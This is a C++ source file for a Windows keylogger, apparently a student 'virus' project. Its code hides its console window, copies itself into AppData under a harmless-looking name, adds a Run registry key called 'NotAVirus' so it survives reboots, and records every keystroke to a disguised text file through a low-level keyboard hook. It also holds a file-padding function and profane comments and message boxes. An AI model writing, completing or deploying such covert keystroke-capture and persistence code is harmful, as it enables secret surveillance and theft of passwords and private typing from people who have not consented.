#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <algorithm>
#include <iterator>


#define WIN32_LEAN_AND_MEAN 
#define log(x,y,z) fprintf(x,y,z); printf(y,z);
#define MAXLOGCOUNT 100


char filepath[200] = "C:\\Users\\";
char dest[200] = "C:\\Users\\";
char username[255];
char logpath[200] = "C:\\Users\\" ;
FILE* file;
HHOOK hook;
int logCount = 1;
const long MB = 1048576;
const int KB = 1024;
const char* TP_MB = "-mb";
const char* TP_KB = "-kb";


void duplicateFile()
{
	std::ifstream source(filepath, std::ios::binary);
	std::ofstream dest(dest, std::ios::binary);
	std::istreambuf_iterator<char> begin_source(source);
	std::istreambuf_iterator<char> end_source;
	std::ostreambuf_iterator<char> begin_dest(dest);
	copy(begin_source, end_source, begin_dest);
	source.close();
	dest.close();
}


LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) 
{
	static int last;
	BOOL letter = 1;//hibjhbjhbjhbkjhbkjbhkjhbkjhbkjhbkjhb
	if (nCode == HC_ACTION) {
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
			int code = p->vkCode;
			if (code == 0xA2) { // LCTRL or first signal of RALT
				last = code;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}
			if (last == 0xA2 && code == 0xA5) { // RALT
				log(file, "%s", "<RALT>");
				letter = 0;
			}
			else if (last == 0xA2 && code != 0xA5) {
				log(file, "%s", "<LCTRL>");
			}
			if (code == 0xA3) {
				letter = 0;
				log(file, "%s", "<RCTRL>");
			}
			if (code == 0xA4) {
				letter = 0;
				log(file, "%s", "<LALT>");
			}
			if (code == 0xA0) {
				letter = 0;
				log(file, "%s", "<LSHIFT>");
			}
			if (code == 0xA1) {
				letter = 0;
				log(file, "%s", "<RSHIFT>");
			}
			if (code == 27) {
				letter = 0;
				log(file, "%s", "<ESC>");
			}
			if (code == 0x0D) {
				letter = 0;
				log(file, "\n", "");
			}
			if (code == 20) {
				letter = 0;
				log(file, "<CAPSLOCK>", "");
			}
			if (code == 9) {
				letter = 0;
				log(file, "<TAB>", "");
			}
			if (code == 192) {
				letter = 0;
				log(file, "~", "");
			}
			if (code == 144) {
				letter = 0;
				log(file, "<NUMLOCK>", "");
			}
			if (code == 111) {
				letter = 0;
				log(file, "/", "");
			}
			if (code == 106) {
				letter = 0;
				log(file, "*", "");
			}
			if (code == 109) {
				letter = 0;
				log(file, "-", "");
			}
			if (code == 107) {
				letter = 0;
				log(file, "+", "");
			}
			if (code == 8) {
				letter = 0;
				log(file, "<BACKSPACE>", "");
			}
			if (code == 165) {
				letter = 0;
				log(file, "<RALT>", "");
			}
			if (code == 37) {
				letter = 0;
				log(file, "<LEFT-ARROW>", "");
			}
			if (code == 38) {
				letter = 0;
				log(file, "<UP-ARROW>", "");
			}
			if (code == 39) {
				letter = 0;
				log(file, "<RIGHT-ARROW>", "");
			}
			if (code == 40) {
				letter = 0;
				log(file, "<DOWN-ARROW>", "");
			}
			last = code;
			if (letter) {
				log(file, "%c", code);
			}
			logCount++;
		}
	}
	if (logCount > MAXLOGCOUNT)
	{
		fclose(file);
		UnhookWindowsHookEx(hook);
		exit(0);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

//write to registery
void plantshit()
{
	HKEY hKey;
	RegOpenKeyExA(
		HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		KEY_WRITE,
		&hKey
	);
	RegSetValueExA(hKey, "NotAVirus", 0, REG_SZ, (BYTE*)dest, sizeof(filepath));
	RegCloseKey(hKey);
}

// file pumper dont use it
bool pumpThatBitch(char *filename, int size, char *type) {
	std::cout << "[+] Pumping " << filename << "\n";
	std::ofstream file(filename, std::ios::out | std::ios::binary | std::ios::ate | std::ios::app);
	int tp_size;
	if (strcmp(type, TP_KB) == 0) tp_size = KB;
	else tp_size = MB;
	if (file.is_open()) {
		for (int i = 0; i < size; i++) {
			for (int x = 0; x < tp_size; x++) {
				file << NULL;
			}
		}
		std::cout << "[+] Success!\n";
	}
	else {
		file.close();
		std::cout << "[-] Fuck, failed to open file.\n";
		return false;
	}
	file.close(); return true;
}


int main(void) 
{
	//hide
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	//welcome!
	/*int userChoice = 0;
	MessageBoxA(NULL, "Hello,\nThis Virus WILL make your HDD shit blood!\n and will also log all your typing.", "Magshimim Virus", MB_ICONEXCLAMATION);
	userChoice = MessageBoxA(NULL, "Are you sure you want to execute it?", "just press yes", MB_YESNO | MB_ICONQUESTION);
	if (userChoice != IDYES)
	{
		MessageBoxA(NULL, "Congrats!!\nYou are a loser!", "Pussy alert!", MB_ICONEXCLAMATION);
		exit(0);
	}*/

	// get username
	DWORD username_len = 255;
	GetUserName(username, &username_len);
	strcat_s(filepath, username);
	strcat_s(filepath, "\\Desktop\\WinApiVirus.exe");
	strcat_s(dest, username);
	strcat_s(dest, "\\AppData\\Roaming\\PatrickStar.exe");
	strcat_s(logpath, username);
	strcat_s(logpath, "\\AppData\\Roaming\\NotLog.txt");

	// plant my shit
	try
	{
		duplicateFile();
		plantshit();
	}
	catch (...) {}

	fopen_s(&file, logpath, "w");
	if (!file)
	{
		MessageBoxA(NULL, "SOMETHING FUCKED UP", "Magshimim Virus", MB_ICONEXCLAMATION);
		MessageBoxA(NULL, logpath, "Magshimim Virus", MB_ICONEXCLAMATION);
	}

	hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, 0, 0);
	MSG msg;
	while (!GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hook);
	return 0;
}